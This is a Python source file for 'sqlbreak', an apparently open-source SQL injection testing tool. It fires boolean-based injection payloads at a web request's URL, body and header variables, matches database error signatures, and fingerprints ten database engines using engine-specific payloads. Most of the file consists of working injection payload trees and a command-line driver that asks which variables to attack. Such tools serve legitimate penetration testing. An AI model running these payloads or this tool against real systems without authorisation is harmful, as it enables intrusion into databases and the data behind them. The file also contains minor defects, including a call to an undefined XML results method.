#   sqlbreak.py: a SQL injection testing tool by Carlos del Ojo (deepbit@gmail.com) 
#   Copyright (C) 2011 Carlos del Ojo Elias 
#    
#   This program is free software; you can redistribute it and/or modify 
#   it under the terms of the GNU General Public License as published by 
#   the Free Software Foundation; either version 2, or (at your option) 
#   any later version. 
#    
#   This program is distributed in the hope that it will be useful, 
#   but WITHOUT ANY WARRANTY; without even the implied warranty of 
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
#   GNU General Public License for more details. 
#    
#   You should have received a copy of the GNU General Public License 
#   along with this program; if not, write to the Free Software Foundation, 
#   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  
#    
#   Written by Carlos del Ojo Elias, deepbit@gmail.com 

import re
import hashlib
from sechttp import *
import sys
import time
import logging
import getopt

class SqlBreak:

	class SqlTest:
		'''This class is a simple sql test. It wraps one LogicNode'''
		def __init__(self,description,lnode):
			self.desc=description
			self.lnode=lnode
	
		def execute(self,req,var,dynObj,inUrl=False):
			return self.lnode.eval(req,var,dynObj,inUrl)
	
	class LogicNode:
		'''A logic node wraps more logic nodes or OperationNodes
		If a logic node is an 'and' type, all the subnodes must evaluta to True
		elif a logic node is an 'or' type, one of the subnodes must evaluate to True'''
		def __init__(self,type):
			assert type in ["and","or"]
			self.type=type
			self.opNodes=[]
		
		def add(self,*args):
			for i in args:
				self.opNodes.append(i)
			return self
		
		def eval(self,req,var,dynObj,inUrl=False):
			success=False		# If it's a type 'or'
			if self.type=="and":
				success=True	# If it's type 'and'
	
			error=None
	
			for i in self.opNodes:
				if self.type=="and":
					# Get the subnode result (T or F) and the error (if it happened)
					bool,errortmp=i.eval(req,var,dynObj,inUrl)
					if not error and errortmp: error=errortmp
					success&=bool
					# We quit if one of the ops is F
					if not success: return success,error
				else:
					bool,errortmp=i.eval(req,var,dynObj,inUrl)
					if not error and errortmp: error=errortmp
					success|=bool
					# We quit if one of the ops is T
					if success: break
	
			return success,error
		
	
	class OpNode:
		def __init__(self,payload,equal):
			self.payload=payload
			self.equal=equal
			self.logic=None
	
		def addLogic(self,logic):
			self.logic=logic
			return self
	
		def eval(self,req,var,dynObj,inUrl=False):
			pay=self.payload
			if inUrl: pay=pay.replace(" ","%20").replace("#","%23").replace("|","%7c").replace(";","%3b").replace("+","%2b")
	
			error=None
	
			var.append(pay)
			logging.debug ("\t\tpay: "+self.payload)
			req.perform()
			var.restore()
	
			ErrorSignature=SqlBreak.SqlError.findall(req.response.getContent())
			if ErrorSignature: 
				error="Var: {0} - Pay: {1} - Signature: {2}".format(var.name,pay,str(ErrorSignature[0]))
	
			if dynObj.equalResponse(req.response) !=self.equal: return False,error
			res=True
	
			if self.logic: 
				bool,errortmp=self.logic.eval(req,var,dynObj,inUrl)
				if not error and errortmp:
					error=errortmp
				res&=bool
	
			return res,error


	class DynamicWordsMixed:
		'''This class keeps the original response and checks if another response is equal or different'''
		def __init__(self,OrigResp):
			self.origWords=SqlBreak.getRESPONSEMd5(OrigResp)
	
		def getInfo(self,BadResponse):
			'''Devuelve CIERTO si HAY DIFERENCIAS despues de una INYECCION'''
			newWords=SqlBreak.getRESPONSEMd5(BadResponse)
			if newWords!=self.origWords:
				return True
			dis=SqlBreak.distance(self.origWords,newWords)
			if dis<90:
				return True
			return False
	
		def equalResponse(self,Response):
			return not self.getInfo(Response)

	@staticmethod
	def getResponseWords (resp):   ### Divide una response en las palabras que la componen
		words={}
		str=resp.getContent()
	
		for i,j in SqlBreak.SCRIPTS.findall(str):
			str=str.replace(i,"")
		str=SqlBreak.TAG.sub("",str)
	
		for j in SqlBreak.REWORDS.findall(str):
			if len(j)>=3:
				words[j]=True
		words=list(words.keys())
		words.sort()
	
		return words

	@staticmethod	
	def distance(words1,words2):
		if not len(words1):
			words1.append('')
	
		if len(words2)>len(words1):
			tmp=words1
			words1=words2
			words2=tmp
	
		words3=[]
		for i in words2:
			if i in words1:
				words3.append(i)
	
		return len(words3)*100/len(words1)

	@staticmethod	
	def getRESPONSEMd5 (resp):	  ### Obtiene el MD5 de una response
		a=hashlib.md5()
		a.update(" ".join(SqlBreak.getResponseWords(resp)).encode())
		return a.hexdigest()

	@staticmethod	
	def stability (req):			  ### Comprueba la estabilidad de la URL y establece el MD5 de la response Original
		req.perform()
		logging.debug("Stab 1 - DONE")
	
		resp1=req.response
		time.sleep(1.1)
		req.perform()
		logging.debug("Stab 2 - DONE")
		resp2=req.response
	
		if SqlBreak.getRESPONSEMd5(resp1)!=SqlBreak.getRESPONSEMd5(resp2):
			logging.debug("Stability FAILED - "+str(req))
			return False,None
	
		logging.debug("URL is STABLE")
		return True,resp1		# Devolvemos si es estable y la respuesta obtenida

		
	TESTS=[	
			SqlTest("Unescaped Injection",
				LogicNode("and").add(
										OpNode(" and 1=1",True).addLogic(LogicNode("or").add(
																								LogicNode("and").add(
																															OpNode(" and 1=2",False),
																															LogicNode("or").add(
																																	OpNode(" and rubsh",False),
																																	LogicNode("and").add(
																																		OpNode(" and char(65)='A'",True),
																																		OpNode(" and char(65)='B'",False)
																																	),
																																	LogicNode("and").add(
																																		OpNode(" and chr(65)='A'",True),
																																		OpNode(" and chr(65)='B'",False)
																																	)
																																)
																													),
																								LogicNode("and").add(
																															OpNode(" or char(1)=char(2)",True),
																															OpNode(" or charr(1)=char(2)",False)
																													),
																								LogicNode("and").add(
																															OpNode(" or chr(1)=chr(2)",True),
																															OpNode(" or chrr(1)=chr(2)",False)
																													),
																								LogicNode("and").add(
																															OpNode(" and char(1)=char(1)-- ",True),
																															OpNode(" and charr(1)=char(1)-- ",False)
																														)
																								)
																			)
										)
				),
	
			SqlTest("Numeric Injection",
				LogicNode("and").add(
										OpNode("-21+21",True),
										OpNode("-21",False),
										OpNode("-rubsh",False)
									)
				),
	
			SqlTest("Single Quoted Injection",
				LogicNode("and").add(	
										OpNode("' and '1'='1",True).addLogic(LogicNode("or").add(
																									LogicNode("and").add(
																															OpNode("' and '1'='2",False),
																															LogicNode("or").add(
																																	OpNode(" and rubsh",False),
																																	LogicNode("and").add(
																																		OpNode("' and char(65)='A",True),
																																		OpNode("' and char(65)='B",False)
																																	),
																																	LogicNode("and").add(
																																		OpNode("' and chr(65)='A",True),
																																		OpNode("' and chr(65)='B",False)
																																	)
																																)
																														),
																									LogicNode("and").add(
																															OpNode("' or char(1)='2",True),
																															OpNode("' or charr(1)='2",False)
																														),
																									LogicNode("and").add(
																															OpNode("' or chr(1)='2",True),
																															OpNode("' or chrr(1)='2",False)
																														),
																									LogicNode("and").add(
																															OpNode("' and char(1)=char(1)-- ",True),
																															OpNode("' and charr(1)=char(1)-- ",False)
																														)
																								)
																			)
									)
				),
	
			SqlTest("Double Quoted Injection",
				LogicNode("and").add(	
										OpNode("\" and \"1\"=\"1",True).addLogic(LogicNode("or").add(
																									LogicNode("and").add(
																															OpNode("\" and \"1\"=\"2",False),
																															LogicNode("or").add(
																																	OpNode(" and rubsh",False),
																																	LogicNode("and").add(
																																		OpNode("\" and char(65)=\"A",True),
																																		OpNode("\" and char(65)=\"B",False)
																																	),
																																	LogicNode("and").add(
																																		OpNode("\" and chr(65)=\"A",True),
																																		OpNode("\" and chr(65)=\"B",False)
																																	)
																																)
																														),
																									LogicNode("and").add(
																															OpNode("\" or char(1)=\"2",True),
																															OpNode("\" or charr(1)=\"2",False)
																														),
																									LogicNode("and").add(
																															OpNode("\" or chr(1)=\"2",True),
																															OpNode("\" or chrr(1)=\"2",False)
																														),
																									LogicNode("and").add(
																															OpNode("\" and char(1)=char(1)-- ",True),
																															OpNode("\" and charr(1)=char(1)-- ",False)
																														)
																								)
																			)
									)
				),
	
			SqlTest("Pipe concatenation Injection",
				LogicNode("or").add(	
										LogicNode("and").add(
											OpNode("'||lower('')||'",True),
											OpNode("'||'21",False),
											OpNode("'||rubsh",False)
										),
										LogicNode("and").add(	
											OpNode("\"||lower(\"\")||\"",True),
											OpNode("\"||\"21",False),
											OpNode("\"||rubsh",False)
										)
									)
				),
	
			SqlTest("Plus concatenation Injection",
				LogicNode("and").add(	LogicNode("and").add(
											OpNode("'+lower('')+'",True),
											OpNode("'+'21",False),
											OpNode("'+rubsh",False)
										),
										LogicNode("and").add(
											OpNode("\"+lower(\"\")+\"",True),
											OpNode("\"+\"21",False),
											OpNode("\"+rubsh",False)
										)
									)
				)
			]

	FINGERTESTS= { 'Unescaped Injection' :[
SqlTest("MySQL",LogicNode("and").add(OpNode(' and CONNECTION_ID()=CONNECTION_ID() and 21=21',True),OpNode(' and USER()=USER() and 21=21',True))) ,
SqlTest("MS Sql Server",LogicNode("and").add(OpNode(' and len(1)=1 and 21=21',True),OpNode(' and len(@@version)=len(@@version) and 21=21',True))) ,
SqlTest("Oracle",LogicNode("and").add(OpNode(' and ROWNUM=ROWNUM and 21=21',True),OpNode(' and length(SYSDATE)=length(SYSDATE) and 21=21',True))) ,
SqlTest("DB2",LogicNode("and").add(OpNode(' and value(1,1)=1 and 21=21',True),OpNode(' and length(CURRENT SERVER)=length(CURRENT SERVER) and 21=21',True))) ,
SqlTest("PostgreSQL",LogicNode("and").add(OpNode(' and length(1)=1 and 21=21',True),OpNode(' and length(SESSION_USER)=length(SESSION_USER) and 21=21',True))) ,
SqlTest("Informix",LogicNode("and").add(OpNode(' and length(DBSERVERNAME)=length(DBSERVERNAME) and 21=21',True),OpNode(' and length(SITENAME)=length(SITENAME) and 21=21',True))) ,
SqlTest("Sybase",LogicNode("and").add(OpNode(' and char_length(db_name())=char_length(db_name()) and 21=21',True),OpNode(' and char_length(@@servername)=char_length(@@servername) and 21=21',True))) ,
SqlTest("MSAccess",LogicNode("and").add(OpNode(' and Time()=Time() and 21=21',True),OpNode(' and IsNumeric(1)=IsNumeric(1) and 21=21',True))) ,
SqlTest("Pointbase",LogicNode("and").add(OpNode(' and CURRENT_USER=CURRENT_USER and 21=21',True),OpNode(' and CURRENT_SESSION=CURRENT_SESSION and 21=21',True))) ,
SqlTest("SQLite",LogicNode("and").add(OpNode(' and sqlite_version()=sqlite_version() and 21=21',True),OpNode(' and last_insert_rowid()=last_insert_rowid() and 21=21',True))) 
],
'Numeric Injection' :[
SqlTest("MySQL",LogicNode("and").add(OpNode('-(CONNECTION_ID()-CONNECTION_ID())',True),OpNode('-(USER()-USER())',True))) ,
SqlTest("MS Sql Server",LogicNode("and").add(OpNode('-(len(1)-1)',True),OpNode('-(len(@@version)-len(@@version))',True))) ,
SqlTest("Oracle",LogicNode("and").add(OpNode('-(ROWNUM-ROWNUM)',True),OpNode('-(length(SYSDATE)-length(SYSDATE))',True))) ,
SqlTest("DB2",LogicNode("and").add(OpNode('-(value(1,1)-1)',True),OpNode('-(length(CURRENT SERVER)-length(CURRENT SERVER))',True))) ,
SqlTest("PostgreSQL",LogicNode("and").add(OpNode('-(length(1)-1)',True),OpNode('-(length(SESSION_USER)-length(SESSION_USER))',True))) ,
SqlTest("Informix",LogicNode("and").add(OpNode('-(length(DBSERVERNAME)-length(DBSERVERNAME))',True),OpNode('-(length(SITENAME)-length(SITENAME))',True))) ,
SqlTest("Sybase",LogicNode("and").add(OpNode('-(char_length(db_name())-char_length(db_name()))',True),OpNode('-(char_length(@@servername)-char_length(@@servername))',True))) ,
SqlTest("MSAccess",LogicNode("and").add(OpNode('-(Time()-Time())',True),OpNode('-(IsNumeric(1)-IsNumeric(1))',True))) ,
SqlTest("Pointbase",LogicNode("and").add(OpNode('-(CURRENT_USER-CURRENT_USER)',True),OpNode('-(CURRENT_SESSION-CURRENT_SESSION)',True))) ,
SqlTest("SQLite",LogicNode("and").add(OpNode('-(sqlite_version()-sqlite_version())',True),OpNode('-(last_insert_rowid()-last_insert_rowid())',True))) 
],
'Single Quoted Injection' :[
SqlTest("MySQL",LogicNode("and").add(OpNode("' and CONNECTION_ID()=CONNECTION_ID() and '21'='21",True),OpNode("' and USER()=USER() and '21'='21",True))) ,
SqlTest("MS Sql Server",LogicNode("and").add(OpNode("' and len(1)=1 and '21'='21",True),OpNode("' and len(@@version)=len(@@version) and '21'='21",True))) ,
SqlTest("Oracle",LogicNode("and").add(OpNode("' and ROWNUM=ROWNUM and '21'='21",True),OpNode("' and length(SYSDATE)=length(SYSDATE) and '21'='21",True))) ,
SqlTest("DB2",LogicNode("and").add(OpNode("' and value(1,1)=1 and '21'='21",True),OpNode("' and length(CURRENT SERVER)=length(CURRENT SERVER) and '21'='21",True))) ,
SqlTest("PostgreSQL",LogicNode("and").add(OpNode("' and length(1)=1 and '21'='21",True),OpNode("' and length(SESSION_USER)=length(SESSION_USER) and '21'='21",True))) ,
SqlTest("Informix",LogicNode("and").add(OpNode("' and length(DBSERVERNAME)=length(DBSERVERNAME) and '21'='21",True),OpNode("' and length(SITENAME)=length(SITENAME) and '21'='21",True))) ,
SqlTest("Sybase",LogicNode("and").add(OpNode("' and char_length(db_name())=char_length(db_name()) and '21'='21",True),OpNode("' and char_length(@@servername)=char_length(@@servername) and '21'='21",True))) ,
SqlTest("MSAccess",LogicNode("and").add(OpNode("' and Time()=Time() and '21'='21",True),OpNode("' and IsNumeric(1)=IsNumeric(1) and '21'='21",True))) ,
SqlTest("Pointbase",LogicNode("and").add(OpNode("' and CURRENT_USER=CURRENT_USER and '21'='21",True),OpNode("' and CURRENT_SESSION=CURRENT_SESSION and '21'='21",True))) ,
SqlTest("SQLite",LogicNode("and").add(OpNode("' and sqlite_version()=sqlite_version() and '21'='21",True),OpNode("' and last_insert_rowid()=last_insert_rowid() and '21'='21",True))) 
],
'Double Quoted Injection' :[
SqlTest("MySQL",LogicNode("and").add(OpNode('" and CONNECTION_ID()=CONNECTION_ID() and "21"="21',True),OpNode('" and USER()=USER() and "21"="21',True))) ,
SqlTest("MS Sql Server",LogicNode("and").add(OpNode('" and len(1)=1 and "21"="21',True),OpNode('" and len(@@version)=len(@@version) and "21"="21',True))) ,
SqlTest("Oracle",LogicNode("and").add(OpNode('" and ROWNUM=ROWNUM and "21"="21',True),OpNode('" and length(SYSDATE)=length(SYSDATE) and "21"="21',True))) ,
SqlTest("DB2",LogicNode("and").add(OpNode('" and value(1,1)=1 and "21"="21',True),OpNode('" and length(CURRENT SERVER)=length(CURRENT SERVER) and "21"="21',True))) ,
SqlTest("PostgreSQL",LogicNode("and").add(OpNode('" and length(1)=1 and "21"="21',True),OpNode('" and length(SESSION_USER)=length(SESSION_USER) and "21"="21',True))) ,
SqlTest("Informix",LogicNode("and").add(OpNode('" and length(DBSERVERNAME)=length(DBSERVERNAME) and "21"="21',True),OpNode('" and length(SITENAME)=length(SITENAME) and "21"="21',True))) ,
SqlTest("Sybase",LogicNode("and").add(OpNode('" and char_length(db_name())=char_length(db_name()) and "21"="21',True),OpNode('" and char_length(@@servername)=char_length(@@servername) and "21"="21',True))) ,
SqlTest("MSAccess",LogicNode("and").add(OpNode('" and Time()=Time() and "21"="21',True),OpNode('" and IsNumeric(1)=IsNumeric(1) and "21"="21',True))) ,
SqlTest("Pointbase",LogicNode("and").add(OpNode('" and CURRENT_USER=CURRENT_USER and "21"="21',True),OpNode('" and CURRENT_SESSION=CURRENT_SESSION and "21"="21',True))) ,
SqlTest("SQLite",LogicNode("and").add(OpNode('" and sqlite_version()=sqlite_version() and "21"="21',True),OpNode('" and last_insert_rowid()=last_insert_rowid() and "21"="21',True))) 
],
'Pipe concatenation Injection' :[
SqlTest("Oracle",LogicNode("and").add(OpNode("'||substr(1,1,(ROWNUM-ROWNUM))||'",True),OpNode("'||substr(1,1,(length(SYSDATE)-length(SYSDATE)))||'",True))) ,
SqlTest("DB2",LogicNode("and").add(OpNode("'||substr('1',1,(value(1,1)-1))||'",True),OpNode("'||substr('1',1,(length(CURRENT SERVER)-length(CURRENT SERVER)))||'",True))) ,
SqlTest("PostgreSQL",LogicNode("and").add(OpNode("'||substr(1,1,(length(1)-1))||'",True),OpNode("'||substr(1,1,(length(SESSION_USER)-length(SESSION_USER)))||'",True))) ,
SqlTest("Informix",LogicNode("and").add(OpNode("'||substr(1,1,(length(DBSERVERNAME)-length(DBSERVERNAME)))||'",True),OpNode("'||substr(1,1,(length(SITENAME)-length(SITENAME)))||'",True))) ,
SqlTest("Pointbase",LogicNode("and").add(OpNode("'||substr(1,1,(CURRENT_USER-CURRENT_USER))||'",True),OpNode("'||substr(1,1,(CURRENT_SESSION-CURRENT_SESSION))||'",True))) ,
SqlTest("SQLite",LogicNode("and").add(OpNode("'||substr(1,1,(sqlite_version()-sqlite_version()))||'",True),OpNode("'||substr(1,1,(last_insert_rowid()-last_insert_rowid()))||'",True))) 
],
'Plus concatenation Injection' :[
SqlTest("MySQL",LogicNode("and").add(OpNode("'+char(CONNECTION_ID()-CONNECTION_ID())+'",True),OpNode("'+char(USER()-USER())+'",True))) ,
SqlTest("MS Sql Server",LogicNode("and").add(OpNode("'+substring('1',1,(len(1)-1))+'",True),OpNode("'+substring('1',1,(len(@@version)-len(@@version)))+'",True))) ,
SqlTest("Sybase",LogicNode("and").add(OpNode("'+char(char_length(db_name())-char_length(db_name()))+'",True),OpNode("'+char(char_length(@@servername)-char_length(@@servername))+'",True))) ,
SqlTest("MSAccess",LogicNode("and").add(OpNode("'+chr(Time()-Time())+'",True),OpNode("'+chr(IsNumeric(1)-IsNumeric(1))+'",True))) 
] }


	REWORDS=re.compile("([a-zA-Z0-9]{3,})")
	SCRIPTS=re.compile("(<script[^>]*>([^<]|<[^s]|<s[^c]|<sc[^r]|<scr[^i]|<scri[^p])*</script>)",re.I)
	TAG=re.compile("<[^>]*>")
	SqlError=re.compile("(MySQL result|SQL syntax.{1,80}MySQL|Driver.{1,80}SQL Server|Driver.{1,80}SQLServer|Sql Server.{1,80}Driver|OLE DB.{1,80}SQL Server|ORA-0|Oracle.{1,80}Driver|Oracle error|SQL.{1,80}ORA|CLI Driver.{1,80}DB2|DB2 SQL error|ERROR.{1,80}parser|PostgreSQL.{1,80}ERROR|Exception.{1,80}Informix|Sybase message|Driver.{1,80}Access|Access.{1,80}Driver|ODBC.{1,80}Microsoft Access|com\.\S+\.jdbc)",re.I)



	def __init__(self,req):
		self.OrigReq=req
		self.results=[]


	def test(self,allVars=True,post=False,get=False,headings=False,varSet=None):
		assert allVars or post or get or headings

		if varSet:
			vars=varSet
		else:
			vars=[]

			if allVars and not post and not get and not headings:
				post=get=headings=True

			# We need a tuple in order to identify the Get variables cos in execute we need to specify inUrl=True
			if get: vars+=[i for i in self.OrigReq.getUrlVars()]
			if headings: vars+=[i for i in self.OrigReq.getHeadingsVars()]
			if post: vars+=[i for i in self.OrigReq.getPostVars()]

		res,resp=self.stability(self.OrigReq)

		if res:
			dynO=SqlBreak.DynamicWordsMixed(resp)

			for v in vars:
				GET=v.extraInfo
				inj=None
				error=None

				logging.debug ("Trying var: "+v.name)
				for t in SqlBreak.TESTS:
					logging.debug ("\tTrying test: "+t.desc)
					if GET=="GET":
						res,errortmp=t.execute(self.OrigReq,v,dynO,inUrl=True)
					else:
						res,errortmp=t.execute(self.OrigReq,v,dynO,inUrl=False)

					if not error and errortmp:
						error=errortmp	
					if res:
						logging.debug ("OK, var {0} is {1}".format(v.name,t.desc))
						inj=t.desc	
						break
				if error:
					logging.debug ("Error Signature Found: "+error)


				finger=None
				if inj:
					for t in SqlBreak.FINGERTESTS[inj]:
						if GET=="GET":
							res,errortmp=t.execute(self.OrigReq,v,dynO,inUrl=True)
						else:
							res,errortmp=t.execute(self.OrigReq,v,dynO,inUrl=False)
						if not error and errortmp:
							error=errortmp	
						if res:
							finger=t.desc
							break
						

	
				if error or inj:
					self.results.append([v.name,inj,error,finger])


if __name__=='__main__':

	def printvars(vars,varsperline,title,startnumber=0):
		if vars:

			print ("================ "+title+" ======================")
			l=int(80/varsperline)
			j=0
			for i in v:
				j+=1
				startnumber+=1
				sys.stdout.write(("{0:>2}. {1:<"+str(l)+"} ").format(startnumber,i.name))
				if j>=varsperline: 
					sys.stdout.write("\r\n")
					sys.stdout.flush()
					j=0
			print ("\r\n")
		

	try:
		opts, args = getopt.getopt(sys.argv[1:], "hb:d:x:D",["xml"])
		optsd=dict(opts)
	
		a=HttpReq()
		a.setUrl(args[0])
		a.headers["User-Agent"]="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
	
		if "-D" in optsd:
			logging.basicConfig(level=logging.DEBUG,format='%(levelname)s ==> \t%(message)s')
		if "-d" in optsd:
			a.setPostData(optsd["-d"])
		if "-b" in optsd:
			a.headers["Cookie"]=optsd["-b"]
		if "-x" in optsd:
			a.setCmgr(HttpCMgr(proxyinfo=optsd["-x"].split(":")))

	except:
		print ("Usage: ./sqlbreak.py [--xml] [-D(ebug)] [-d POSTDATA] [-b COOKIE] [-x PROXY] URL")
		sys.exit(-1)

	s=SqlBreak(a)

	varsperline=int(80/(max([len(i.name) for i in a.getVars()])+5))
	vars=[]
	v=a.getUrlVars()
	printvars(v,varsperline,"Variables in URL",0)
	vars+=[i for i in v]
	v=a.getPostVars()
	printvars(v,varsperline,"Variables in Body",len(vars))
	vars+=[i for i in v]
	v=a.getHeadingsVars()
	printvars(v,varsperline,"Variables in Headings",len(vars))
	vars+=[i for i in v]

	sys.stdout.write("Select the variableis you want to attack (separated numbers) [all]:")
	sys.stdout.flush()
	ns=re.findall("[0-9]+",sys.stdin.readline())
	if not ns:
		varsattack=vars
	else:
		varsattack=[vars[int(i)-1] for i in ns]


	s.test(varSet=varsattack)
	if "--xml" in optsd:
		print (s.getXMLResults().toprettyxml(indent="\t"))
	else:
		for name,inj,error,finger in s.results:
			print ("# -------------------------------------")
			print ("#              Variable : "+str(name))
			print ("#        Injection type : "+str(inj))
			print ("# Signature error found : "+str(error))
			print ("#  Database Fingerprint : "+str(finger))
			print ("# -------------------------------------")
